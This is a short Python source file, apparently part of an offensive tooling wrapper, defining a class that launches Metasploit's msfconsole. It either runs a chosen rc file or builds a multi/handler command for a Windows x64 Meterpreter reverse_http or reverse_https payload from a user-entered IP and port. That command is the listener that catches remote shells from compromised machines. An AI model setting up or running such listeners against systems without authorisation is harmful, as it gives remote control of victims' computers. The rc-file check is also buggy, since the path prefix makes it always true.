import os

class msflistener:
    def __init__(self):
        self.values={'source':'',
                     'IP':'',
                     'Port':'',
                     'payload':'',
                     }

    def show_source(self):
        return self.values['source']


    def show_information(self):
        self.values['IP'] = input("Your IP:")
        self.values['Port'] = input('Port:')
        self.values['payload'] = input("payload(reverse_https or reverse_http):")


    def run_action(self):
        source = './temp/'+self.show_source()
        if source:
            print('msfconsole rc source : %s'%source)
            input('Type any key to Continue')
            os.system('msfconsole -r %s'%source)
        else:
            print("You don't set msfconsole rc file, please input connect information\n")
            self.show_information()
            os.system('msfconsole -x "use multi/handler;set PAYLOAD windows/x64/meterpreter/%s;set LHOST %s;set LPORT %s;exploit -j -z"'
                      % (self.values['payload'],
                         self.values['IP'],
                         self.values['Port'],))